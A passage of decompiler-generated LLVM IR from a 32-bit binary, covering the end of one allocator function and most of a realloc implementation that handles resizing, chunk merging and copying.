  %v6_8050479 = or i32 %v5_8050479, 1
  store i32 %v6_8050479, i32* %v4_8050479, align 4
  br label %dec_label_pc_805047e

dec_label_pc_805047e:                             ; preds = %dec_label_pc_804ff81, %dec_label_pc_8050479
  %v0_805047e = load i32, i32* @ecx, align 4
  store i32 %v0_805047e, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805048f

dec_label_pc_8050482:                             ; preds = %dec_label_pc_8050240, %dec_label_pc_80503f6, %dec_label_pc_805024a
  %v0_8050482 = load i32, i32* %stack_var_-92, align 4
  %v1_8050482 = call i32 @__errno_location(i32 %v0_8050482)
  store i32 %v1_8050482, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8050489 = inttoptr i32 %v1_8050482 to i32*
  store i32 12, i32* %v1_8050489, align 4
  br label %dec_label_pc_805048f

dec_label_pc_805048f:                             ; preds = %dec_label_pc_805047e, %dec_label_pc_8050474, %dec_label_pc_805041f, %dec_label_pc_80500db, %dec_label_pc_805008d, %dec_label_pc_804fe14, %dec_label_pc_8050482
  store i32 %v2_804fd4b, i32* @eax, align 4
  store i32 %v2_804fd4b, i32* %stack_var_-92, align 4
  %v2_8050498 = call i32 @__pthread_return_void(i32 %v2_804fd4b, i32 1)
  store i32 %v2_8050498, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80504a0

dec_label_pc_80504a0:                             ; preds = %dec_label_pc_804fd69, %dec_label_pc_805048f
  %v0_80504a3 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80504a3, i32* %eax.global-to-local, align 4
  %v2_80504a5 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80504a5, i32* @ebx, align 4
  store i32 %v0_804fd38, i32* @esi, align 4
  store i32 %v0_804fd37, i32* @edi, align 4
  store i32 %v0_804fd36, i32* @ebp, align 4
  ret i32 %v0_80504a3

; uselistorder directives
  uselistorder i32 %v0_8050466, { 1, 0 }
  uselistorder i32 %v0_8050446, { 1, 0, 2 }
  uselistorder i32 %v2_80503e3, { 1, 0, 2 }
  uselistorder i32 %v0_80503d1, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8050368, { 1, 0 }
  uselistorder i32 %v2_8050356, { 1, 0 }
  uselistorder i32 %v1_805030d, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_80502f7, { 1, 0, 2 }
  uselistorder i32 %v2_80502eb, { 1, 2, 0 }
  uselistorder i32 %v2_80502e6, { 1, 0, 2 }
  uselistorder i32 %v1_80502d6, { 2, 1, 0 }
  uselistorder i8 %v0_80502a4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_8050287, { 1, 0, 2 }
  uselistorder i32 %v0_805033b91, { 2, 0, 1 }
  uselistorder i32 %v0_805034992, { 3, 4, 1, 2, 5, 0, 7, 6 }
  uselistorder i32 %v1_8050281, { 2, 1, 0 }
  uselistorder i32 %v8_8050257, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8050254, { 1, 0 }
  uselistorder i32 %v0_8050233, { 1, 0 }
  uselistorder i32 %v2_8050204, { 2, 1, 0, 3 }
  uselistorder i32 %v1_80501fc, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_80501e9, { 1, 0 }
  uselistorder i32 %v1_80501e0, { 5, 0, 1, 2, 3, 4, 6, 7 }
  uselistorder i32 %v0_80501cd, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_80501b1, { 1, 0, 2 }
  uselistorder i32 %v2_805019d, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8050166, { 1, 2, 0, 3 }
  uselistorder i32 %v1_805015a, { 2, 1, 0 }
  uselistorder i32 %v8_8050149, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32 %v2_8050130, { 1, 0, 2 }
  uselistorder i32 %v0_80500cc, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_805009f, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8050095, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_8050087, { 1, 0 }
  uselistorder i32 %v1_805001e, { 1, 0 }
  uselistorder i32 %v3_8050012, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_8050022, { 1, 0 }
  uselistorder i32 %v2_805000c, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_805000912, { 1, 0 }
  uselistorder i32 %v2_804fffe, { 1, 0 }
  uselistorder i32 %v1_804ffe2, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804ffde, { 2, 1, 0 }
  uselistorder i32 %v1_804ffda, { 1, 0 }
  uselistorder i32 %v1_804ffce, { 2, 1, 0 }
  uselistorder i32 %v2_804ffc4, { 1, 0 }
  uselistorder i32 %v1_804ffc1, { 1, 2, 0 }
  uselistorder i32 %v4_804ff5f, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_804ffaa, { 1, 0 }
  uselistorder i32 %v0_804ff78, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804ff4b, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804ff18, { 1, 2, 0 }
  uselistorder i32 %v2_804fefc, { 1, 0 }
  uselistorder i32 %v1_804fef2, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_804feed.lcssa, { 1, 0 }
  uselistorder i32 %v3_804fedd, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_804fed4, { 1, 0, 2 }
  uselistorder i32 %v2_804feb0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804fe98, { 2, 1, 0 }
  uselistorder i32 %v0_804fe84, { 2, 0, 3, 1 }
  uselistorder i32 %v3_804fe4a, { 1, 0, 2 }
  uselistorder i32 %v0_804ff18111, { 0, 3, 1, 2 }
  uselistorder i32 %v3_804fdf7, { 1, 0, 2 }
  uselistorder i32 %v2_804fde9, { 2, 1, 0 }
  uselistorder i32 %v2_804fdc4, { 2, 1, 0 }
  uselistorder i8 %v0_804fd92, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_805012a, { 13, 31, 11, 2, 29, 12, 3, 22, 21, 10, 9, 4, 24, 23, 20, 18, 19, 5, 25, 26, 6, 27, 28, 15, 7, 16, 17, 8, 30, 14, 0, 32, 34, 33, 1, 35 }
  uselistorder i32 %v1_804fd7b, { 0, 2, 1 }
  uselistorder i32 %v0_804fd64, { 1, 0 }
  uselistorder i32 %v2_804fd4b, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ebx.global-to-local, { 21, 1, 2, 3, 4, 5, 6, 7, 8, 13, 10, 0, 11, 12, 14, 15, 16, 17, 9, 18, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_8060180.241, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134610516, { 2, 3, 1, 0 }
  uselistorder i32* @global_var_805fe60.229, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805fe4c.226 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_805fe4c.226 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_80504a0, { 1, 0 }
  uselistorder label %dec_label_pc_805048f, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8050482, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805047e, { 1, 0 }
  uselistorder label %dec_label_pc_8050474, { 1, 0 }
  uselistorder label %dec_label_pc_805041f, { 1, 0 }
  uselistorder label %dec_label_pc_80503f6, { 1, 0 }
  uselistorder label %dec_label_pc_80503e3, { 1, 0 }
  uselistorder label %dec_label_pc_80503d1, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8050363, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805035e, { 1, 0 }
  uselistorder label %dec_label_pc_8050342, { 1, 0 }
  uselistorder label %dec_label_pc_80502eb, { 1, 0 }
  uselistorder label %dec_label_pc_80502d4, { 1, 0 }
  uselistorder label %dec_label_pc_80502bd, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8050240, { 1, 0 }
  uselistorder label %dec_label_pc_8050233, { 1, 0 }
  uselistorder label %dec_label_pc_80501f4, { 1, 0 }
  uselistorder label %dec_label_pc_80501cd, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80501b1, { 1, 0 }
  uselistorder label %dec_label_pc_8050198, { 1, 0 }
  uselistorder label %dec_label_pc_805017a, { 1, 0 }
  uselistorder label %dec_label_pc_8050095, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805008d, { 1, 0 }
  uselistorder label %dec_label_pc_8050076, { 1, 0 }
  uselistorder label %dec_label_pc_8050009, { 1, 0 }
  uselistorder label %dec_label_pc_805000e.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804ffe2, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ff69, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_804fef0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804fed9, { 1, 0 }
  uselistorder label %dec_label_pc_804fe47, { 1, 0 }
  uselistorder label %dec_label_pc_804ff18.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fe14, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804fd92, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_80504ae = load i32, i32* @esi, align 4
  %v0_80504af = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_80504b7 = icmp eq i32* %arg1, null
  %v1_80504bc = icmp eq i1 %v4_80504b7, false
  br i1 %v1_80504bc, label %dec_label_pc_80504ce, label %dec_label_pc_80504be

dec_label_pc_80504be:                             ; preds = %entry
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_80504c2 = call i32 @malloc(i32 %arg2)
  store i32 %v1_80504c2, i32* %eax.global-to-local, align 4
  store i32 %v1_80504c2, i32* @ebx, align 4
  br label %dec_label_pc_80507c7

dec_label_pc_80504ce:                             ; preds = %entry
  %v1_80504ce = icmp eq i32 %arg2, 0
  %v1_80504d0 = icmp eq i1 %v1_80504ce, false
  br i1 %v1_80504d0, label %dec_label_pc_80504e3, label %dec_label_pc_80504d2

dec_label_pc_80504d2:                             ; preds = %dec_label_pc_80504ce
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_80504d9 = call i32 @free(i32 %tmp7)
  store i32 %v1_80504d9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80507c7

dec_label_pc_80504e3:                             ; preds = %dec_label_pc_80504ce
  %v2_80504ee = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80504ee, i32* @eax, align 4
  store i32 %v2_80504ee, i32* %stack_var_-60, align 4
  %v2_80504f3 = call i32 @__pthread_return_void(i32 %v2_80504ee, i32 134550975)
  store i32 %v2_80504f3, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80599b0.224 to i32), i32* %stack_var_-60, align 4
  %v1_80504ff = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80599b0.224 to i32))
  store i32 %v1_80504ff, i32* %eax.global-to-local, align 4
  %v0_8050507 = load i32, i32* @ebx, align 4
  %tmp20 = icmp ult i32 %v0_8050507, -32
  br i1 %tmp20, label %dec_label_pc_805051e, label %dec_label_pc_805050c

dec_label_pc_805050c:                             ; preds = %dec_label_pc_80504e3
  %v0_805050c = load i32, i32* %stack_var_-60, align 4
  %v1_805050c = call i32 @__errno_location(i32 %v0_805050c)
  store i32 %v1_805050c, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8050513 = inttoptr i32 %v1_805050c to i32*
  store i32 12, i32* %v1_8050513, align 4
  br label %dec_label_pc_80507ca

dec_label_pc_805051e:                             ; preds = %dec_label_pc_80504e3
  %v1_805051e = add i32 %v0_8050507, 11
  %tmp21 = icmp ult i32 %v1_805051e, 16
  br i1 %tmp21, label %dec_label_pc_8050535, label %dec_label_pc_805052e

dec_label_pc_805052e:                             ; preds = %dec_label_pc_805051e
  %v1_805052e = and i32 %v1_805051e, -8
  br label %dec_label_pc_8050535

dec_label_pc_8050535:                             ; preds = %dec_label_pc_805051e, %dec_label_pc_805052e
  %stack_var_-40.0 = phi i32 [ %v1_805052e, %dec_label_pc_805052e ], [ 16, %dec_label_pc_805051e ]
  %storemerge27 = phi i32 [ %v1_805052e, %dec_label_pc_805052e ], [ %v1_805051e, %dec_label_pc_805051e ]
  store i32 %storemerge27, i32* %eax.global-to-local, align 4
  %v1_8050539 = add i32 %tmp7, -8
  store i32 %v1_8050539, i32* @edi, align 4
  %v1_805053c = add i32 %tmp7, -4
  %v2_805053c = inttoptr i32 %v1_805053c to i32*
  %v3_805053c = load i32, i32* %v2_805053c, align 4
  store i32 %v3_805053c, i32* @edx, align 4
  %v1_8050541 = and i32 %v3_805053c, -4
  store i32 %v1_8050541, i32* %eax.global-to-local, align 4
  %v2_8050548 = and i32 %v3_805053c, 2
  %v3_8050548 = icmp eq i32 %v2_8050548, 0
  %v1_805054b = icmp eq i1 %v3_8050548, false
  br i1 %v1_805054b, label %dec_label_pc_80506e5, label %dec_label_pc_8050551

dec_label_pc_8050551:                             ; preds = %dec_label_pc_8050535
  store i32 %stack_var_-40.0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8050541, i32* @ebx, align 4
  %v7_8050557 = icmp ult i32 %v1_8050541, %stack_var_-40.0
  %v1_8050559 = icmp eq i1 %v7_8050557, false
  br i1 %v1_8050559, label %dec_label_pc_8050690, label %dec_label_pc_805055f

dec_label_pc_805055f:                             ; preds = %dec_label_pc_8050551
  %v2_805055f = add i32 %v1_8050541, %v1_8050539
  store i32 %v2_805055f, i32* @esi, align 4
  %v1_8050562 = load i32, i32* @global_var_805fe4c.226, align 4
  %v12_8050562 = icmp eq i32 %v2_805055f, %v1_8050562
  %v1_8050568 = icmp eq i1 %v12_8050562, false
  %v1_80505a2 = add i32 %v2_805055f, 4
  %v2_80505a2 = inttoptr i32 %v1_80505a2 to i32*
  %v3_80505a2 = load i32, i32* %v2_80505a2, align 4
  br i1 %v1_8050568, label %dec_label_pc_80505a2, label %dec_label_pc_805056a

dec_label_pc_805056a:                             ; preds = %dec_label_pc_805055f
  %v1_805056f = and i32 %v3_80505a2, -4
  %v2_8050572 = add i32 %v1_805056f, %v1_8050541
  store i32 %v2_8050572, i32* %ecx.global-to-local, align 4
  %v1_8050578 = add i32 %stack_var_-40.0, 16
  store i32 %v1_8050578, i32* %eax.global-to-local, align 4
  %v7_805057b = icmp ult i32 %v2_8050572, %v1_8050578
  br i1 %v7_805057b, label %dec_label_pc_80505e0, label %dec_label_pc_805057f

dec_label_pc_805057f:                             ; preds = %dec_label_pc_805056a
  %v1_805057f = urem i32 %v3_805053c, 2
  %v5_8050582 = or i32 %v1_805057f, %stack_var_-40.0
  store i32 %v5_8050582, i32* @edx, align 4
  store i32 %v5_8050582, i32* %v2_805053c, align 4
  %v0_805058d = load i32, i32* %ecx.global-to-local, align 4
  %v2_805058d = sub i32 %v0_805058d, %stack_var_-40.0
  %v0_805058f = load i32, i32* @edi, align 4
  %v2_805058f = add i32 %v0_805058f, %stack_var_-40.0
  store i32 %v2_805058f, i32* %eax.global-to-local, align 4
  %v1_8050592 = or i32 %v2_805058d, 1
  store i32 %v1_8050592, i32* %ecx.global-to-local, align 4
  store i32 %v2_805058f, i32* @global_var_805fe4c.226, align 4
  %v2_805059a = add i32 %v2_805058f, 4
  %v3_805059a = inttoptr i32 %v2_805059a to i32*
  store i32 %v1_8050592, i32* %v3_805059a, align 4
  br label %dec_label_pc_80507b5

dec_label_pc_80505a2:                             ; preds = %dec_label_pc_805055f
  %v1_80505a7 = and i32 %v3_80505a2, -2
  store i32 %v1_80505a7, i32* %eax.global-to-local, align 4
  %v3_80505aa = add i32 %v1_80505a2, %v1_80505a7
  %v4_80505aa = inttoptr i32 %v3_80505aa to i8*
  %v5_80505aa = load i8, i8* %v4_80505aa, align 1
  %v6_80505aa = urem i8 %v5_80505aa, 2
  %v7_80505aa = icmp eq i8 %v6_80505aa, 0
  %v1_80505af = icmp eq i1 %v7_80505aa, false
  br i1 %v1_80505af, label %dec_label_pc_80505e0, label %dec_label_pc_80505b1

dec_label_pc_80505b1:                             ; preds = %dec_label_pc_80505a2
  %v1_80505b1 = and i32 %v3_80505a2, -4
  %v2_80505b8 = add i32 %v1_80505b1, %v1_8050541
  store i32 %v2_80505b8, i32* @ebx, align 4
  %v10_80505ba = icmp ult i32 %v2_80505b8, %stack_var_-40.0
  br i1 %v10_80505ba, label %dec_label_pc_80505e0, label %dec_label_pc_80505c0

dec_label_pc_80505c0:                             ; preds = %dec_label_pc_80505b1
  %v1_80505c0 = add i32 %v1_8050541, %tmp7
  %v2_80505c0 = inttoptr i32 %v1_80505c0 to i32*
  %v3_80505c0 = load i32, i32* %v2_80505c0, align 4
  store i32 %v3_80505c0, i32* @edx, align 4
  %v1_80505c3 = add i32 %v2_805055f, 12
  %v2_80505c3 = inttoptr i32 %v1_80505c3 to i32*
  %v3_80505c3 = load i32, i32* %v2_80505c3, align 4
  store i32 %v3_80505c3, i32* %eax.global-to-local, align 4
  %v1_80505c6 = add i32 %v3_80505c0, 12
  %v2_80505c6 = inttoptr i32 %v1_80505c6 to i32*
  %v3_80505c6 = load i32, i32* %v2_80505c6, align 4
  %v15_80505c6 = icmp eq i32 %v3_80505c6, %v2_805055f
  %v1_80505c9 = icmp eq i1 %v15_80505c6, false
  br i1 %v1_80505c9, label %dec_label_pc_80505d0, label %dec_label_pc_80505cb

dec_label_pc_80505cb:                             ; preds = %dec_label_pc_80505c0
  %v1_80505cb = add i32 %v3_80505c3, 8
  %v2_80505cb = inttoptr i32 %v1_80505cb to i32*
  %v3_80505cb = load i32, i32* %v2_80505cb, align 4
  %v15_80505cb = icmp eq i32 %v3_80505cb, %v2_805055f
  br i1 %v15_80505cb, label %dec_label_pc_80505d5, label %dec_label_pc_80505d0

dec_label_pc_80505d0:                             ; preds = %dec_label_pc_80505cb, %dec_label_pc_80505c0
  %v0_80505d0 = call i32 @abort()
  store i32 %v0_80505d0, i32* %eax.global-to-local, align 4
  %v1_80505d5.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80505d5

dec_label_pc_80505d5:                             ; preds = %dec_label_pc_80505cb, %dec_label_pc_80505d0
  %v1_80505d5 = phi i32 [ %v3_80505c0, %dec_label_pc_80505cb ], [ %v1_80505d5.pre, %dec_label_pc_80505d0 ]
  %v0_80505d5 = phi i32 [ %v3_80505c3, %dec_label_pc_80505cb ], [ %v0_80505d0, %dec_label_pc_80505d0 ]
  %v2_80505d5 = add i32 %v1_80505d5, 12
  %v3_80505d5 = inttoptr i32 %v2_80505d5 to i32*
  store i32 %v0_80505d5, i32* %v3_80505d5, align 4
  %v0_80505d8 = load i32, i32* @edx, align 4
  %v1_80505d8 = load i32, i32* %eax.global-to-local, align 4
  %v2_80505d8 = add i32 %v1_80505d8, 8
  %v3_80505d8 = inttoptr i32 %v2_80505d8 to i32*
  store i32 %v0_80505d8, i32* %v3_80505d8, align 4
  %v0_8050690.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050690

dec_label_pc_80505e0:                             ; preds = %dec_label_pc_80505b1, %dec_label_pc_80505a2, %dec_label_pc_805056a
  %v1_80505e7 = add i32 %stack_var_-40.0, -7
  store i32 %v1_80505e7, i32* %eax.global-to-local, align 4
  store i32 %v1_80505e7, i32* %stack_var_-60, align 4
  %v1_80505eb = call i32 @malloc(i32 %v1_80505e7)
  store i32 %v1_80505eb, i32* %eax.global-to-local, align 4
  store i32 %v1_80505eb, i32* @edx, align 4
  %v1_80505f5 = icmp eq i32 %v1_80505eb, 0
  br i1 %v1_80505f5, label %dec_label_pc_80507b1, label %dec_label_pc_80505fd

dec_label_pc_80505fd:                             ; preds = %dec_label_pc_80505e0
  %v1_80505fd = add i32 %v1_80505eb, -8
  store i32 %v1_80505fd, i32* %ebx.global-to-local, align 4
  %v1_8050600 = load i32, i32* @esi, align 4
  %v12_8050600 = icmp eq i32 %v1_80505fd, %v1_8050600
  %v1_8050602 = add i32 %v1_80505eb, -4
  %v2_8050602 = inttoptr i32 %v1_8050602 to i32*
  %v3_8050602 = load i32, i32* %v2_8050602, align 4
  store i32 %v3_8050602, i32* %eax.global-to-local, align 4
  %v1_8050605 = icmp eq i1 %v12_8050600, false
  br i1 %v1_8050605, label %dec_label_pc_8050613, label %dec_label_pc_8050607

dec_label_pc_8050607:                             ; preds = %dec_label_pc_80505fd
  %v1_8050607 = and i32 %v3_8050602, -4
  store i32 %v1_8050607, i32* %eax.global-to-local, align 4
  store i32 %v1_8050541, i32* @edx, align 4
  %v2_805060e = add i32 %v1_8050607, %v1_8050541
  store i32 %v2_805060e, i32* @ebx, align 4
  br label %dec_label_pc_8050690

dec_label_pc_8050613:                             ; preds = %dec_label_pc_80505fd
  %v1_8050617 = add i32 %v1_8050541, -4
  store i32 %v1_8050617, i32* %eax.global-to-local, align 4
  %v2_805061c = udiv i32 %v1_8050617, 4
  store i32 %v2_805061c, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8050617, 37
  br i1 %tmp, label %dec_label_pc_8050635, label %dec_label_pc_8050624

dec_label_pc_8050624:                             ; preds = %dec_label_pc_8050613
  store i32 %v1_80505eb, i32* %stack_var_-60, align 4
  %v3_805062b = inttoptr i32 %v1_80505eb to i16*
  %v4_805062b = call i32 @memcpy(i16* %v3_805062b, i32 %tmp7, i32 %v1_8050617)
  store i32 %v4_805062b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805067c

dec_label_pc_8050635:                             ; preds = %dec_label_pc_8050613
  store i32 %tmp7, i32* @esi, align 4
  %v2_805063c = load i32, i32* %arg1, align 4
  store i32 %v2_805063c, i32* %eax.global-to-local, align 4
  %v2_805063e = inttoptr i32 %v1_80505eb to i32*
  store i32 %v2_805063c, i32* %v2_805063e, align 4
  %v0_8050640 = load i32, i32* @esi, align 4
  %v1_8050640 = add i32 %v0_8050640, 4
  %v2_8050640 = inttoptr i32 %v1_8050640 to i32*
  %v3_8050640 = load i32, i32* %v2_8050640, align 4
  store i32 %v3_8050640, i32* %eax.global-to-local, align 4
  %v1_8050643 = load i32, i32* @edx, align 4
  %v2_8050643 = add i32 %v1_8050643, 4
  %v3_8050643 = inttoptr i32 %v2_8050643 to i32*
  store i32 %v3_8050640, i32* %v3_8050643, align 4
  %v0_8050646 = load i32, i32* @esi, align 4
  %v1_8050646 = add i32 %v0_8050646, 8
  %v2_8050646 = inttoptr i32 %v1_8050646 to i32*
  %v3_8050646 = load i32, i32* %v2_8050646, align 4
  store i32 %v3_8050646, i32* %eax.global-to-local, align 4
  %v1_8050649 = load i32, i32* @edx, align 4
  %v2_8050649 = add i32 %v1_8050649, 8
  %v3_8050649 = inttoptr i32 %v2_8050649 to i32*
  store i32 %v3_8050646, i32* %v3_8050649, align 4
  %tmp28 = icmp ult i32 %v1_8050617, 17
  br i1 %tmp28, label %dec_label_pc_805067c, label %dec_label_pc_805064e

dec_label_pc_805064e:                             ; preds = %dec_label_pc_8050635
  %v0_805064e = load i32, i32* @esi, align 4
  %v1_805064e = add i32 %v0_805064e, 12
  %v2_805064e = inttoptr i32 %v1_805064e to i32*
  %v3_805064e = load i32, i32* %v2_805064e, align 4
  store i32 %v3_805064e, i32* %eax.global-to-local, align 4
  %v0_8050651 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050654 = load i32, i32* @edx, align 4
  %v2_8050654 = add i32 %v1_8050654, 12
  %v3_8050654 = inttoptr i32 %v2_8050654 to i32*
  store i32 %v3_805064e, i32* %v3_8050654, align 4
  %v0_8050657 = load i32, i32* @esi, align 4
  %v1_8050657 = add i32 %v0_8050657, 16
  %v2_8050657 = inttoptr i32 %v1_8050657 to i32*
  %v3_8050657 = load i32, i32* %v2_8050657, align 4
  store i32 %v3_8050657, i32* %eax.global-to-local, align 4
  %v1_805065a = load i32, i32* @edx, align 4
  %v2_805065a = add i32 %v1_805065a, 16
  %v3_805065a = inttoptr i32 %v2_805065a to i32*
  store i32 %v3_8050657, i32* %v3_805065a, align 4
  %tmp22 = icmp ult i32 %v0_8050651, 7
  br i1 %tmp22, label %dec_label_pc_805067c, label %dec_label_pc_805065f

dec_label_pc_805065f:                             ; preds = %dec_label_pc_805064e
  %v0_805065f = load i32, i32* @esi, align 4
  %v1_805065f = add i32 %v0_805065f, 20
  %v2_805065f = inttoptr i32 %v1_805065f to i32*
  %v3_805065f = load i32, i32* %v2_805065f, align 4
  store i32 %v3_805065f, i32* %eax.global-to-local, align 4
  %v0_8050662 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050665 = load i32, i32* @edx, align 4
  %v2_8050665 = add i32 %v1_8050665, 20
  %v3_8050665 = inttoptr i32 %v2_8050665 to i32*
  store i32 %v3_805065f, i32* %v3_8050665, align 4
  %v0_8050668 = load i32, i32* @esi, align 4
  %v1_8050668 = add i32 %v0_8050668, 24
  %v2_8050668 = inttoptr i32 %v1_8050668 to i32*
  %v3_8050668 = load i32, i32* %v2_8050668, align 4
  store i32 %v3_8050668, i32* %eax.global-to-local, align 4
  %v1_805066b = load i32, i32* @edx, align 4
  %v2_805066b = add i32 %v1_805066b, 24
  %v3_805066b = inttoptr i32 %v2_805066b to i32*
  store i32 %v3_8050668, i32* %v3_805066b, align 4
  %tmp23 = icmp ult i32 %v0_8050662, 9
  br i1 %tmp23, label %dec_label_pc_805067c, label %dec_label_pc_8050670

dec_label_pc_8050670:                             ; preds = %dec_label_pc_805065f
  %v0_8050670 = load i32, i32* @esi, align 4
  %v1_8050670 = add i32 %v0_8050670, 28
  %v2_8050670 = inttoptr i32 %v1_8050670 to i32*
  %v3_8050670 = load i32, i32* %v2_8050670, align 4
  store i32 %v3_8050670, i32* %eax.global-to-local, align 4
  %v1_8050673 = load i32, i32* @edx, align 4
  %v2_8050673 = add i32 %v1_8050673, 28
  %v3_8050673 = inttoptr i32 %v2_8050673 to i32*
  store i32 %v3_8050670, i32* %v3_8050673, align 4
  %v0_8050676 = load i32, i32* @esi, align 4
  %v1_8050676 = add i32 %v0_8050676, 32
  %v2_8050676 = inttoptr i32 %v1_8050676 to i32*
  %v3_8050676 = load i32, i32* %v2_8050676, align 4
  store i32 %v3_8050676, i32* %eax.global-to-local, align 4
  %v1_8050679 = load i32, i32* @edx, align 4
  %v2_8050679 = add i32 %v1_8050679, 32
  %v3_8050679 = inttoptr i32 %v2_8050679 to i32*
  store i32 %v3_8050676, i32* %v3_8050679, align 4
  br label %dec_label_pc_805067c

dec_label_pc_805067c:                             ; preds = %dec_label_pc_805065f, %dec_label_pc_805064e, %dec_label_pc_8050635, %dec_label_pc_8050624, %dec_label_pc_8050670
  %v0_805067f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805067f = add i32 %v0_805067f, 8
  store i32 %v1_805067f, i32* @ebx, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8050686 = call i32 @free(i32 %tmp7)
  br label %dec_label_pc_80507ac

dec_label_pc_8050690:                             ; preds = %dec_label_pc_8050551, %dec_label_pc_8050607, %dec_label_pc_80505d5
  %v1_80506a1 = phi i32 [ %v1_8050541, %dec_label_pc_8050551 ], [ %v2_805060e, %dec_label_pc_8050607 ], [ %v0_8050690.pre, %dec_label_pc_80505d5 ]
  %v5_8050692 = sub i32 %v1_80506a1, %stack_var_-40.0
  store i32 %v5_8050692, i32* %ecx.global-to-local, align 4
  %tmp24 = icmp ult i32 %v5_8050692, 16
  br i1 %tmp24, label %dec_label_pc_805069b, label %dec_label_pc_80506ad

dec_label_pc_805069b:                             ; preds = %dec_label_pc_8050690
  %v0_805069b = load i32, i32* @edi, align 4
  %v1_805069b = add i32 %v0_805069b, 4
  %v2_805069b = inttoptr i32 %v1_805069b to i32*
  %v3_805069b = load i32, i32* %v2_805069b, align 4
  %v1_805069e = urem i32 %v3_805069b, 2
  %v2_80506a1 = or i32 %v1_805069e, %v1_80506a1
  store i32 %v2_80506a1, i32* %eax.global-to-local, align 4
  store i32 %v2_80506a1, i32* %v2_805069b, align 4
  %v0_80506a6 = load i32, i32* @edi, align 4
  %v1_80506a6 = load i32, i32* @ebx, align 4
